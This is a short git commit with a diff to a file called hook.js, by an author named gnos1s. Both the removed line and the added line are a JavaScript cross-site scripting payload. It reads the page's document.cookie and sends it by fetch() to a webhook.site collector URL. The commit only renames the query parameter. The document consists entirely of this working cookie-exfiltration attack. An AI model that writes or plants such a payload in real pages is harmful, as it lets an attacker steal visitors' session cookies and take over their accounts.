b1db12301e6d08b860047ce100a027193d7e49e3
gnos1s <99853496+firephyte@users.noreply.github.com>
2024-02-28 14:52:41 +0800

    Update hook.js

--- hook.js
+++ hook.js
@@ -1,1 +1,1 @@
-fetch('https://webhook.site/02bfe618-5d08-45aa-b468-9a5967991949/?c=' + document.cookie);
+fetch('https://webhook.site/02bfe618-5d08-45aa-b468-9a5967991949?cookie=' + document.cookie);
